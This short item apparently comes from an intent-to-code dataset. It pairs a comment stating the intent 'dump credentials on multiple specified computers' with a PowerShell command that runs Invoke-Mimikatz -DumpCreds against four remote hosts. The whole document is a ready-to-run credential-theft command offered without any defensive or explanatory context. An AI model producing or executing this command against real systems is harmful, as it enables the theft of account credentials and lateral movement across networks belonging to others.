# Natural language intent:
# Invoke Mimikatz to dump credentials on multiple specified computers.

Invoke-Mimikatz -DumpCreds -ComputerName @(computer1, computer2,computer3,computer4)
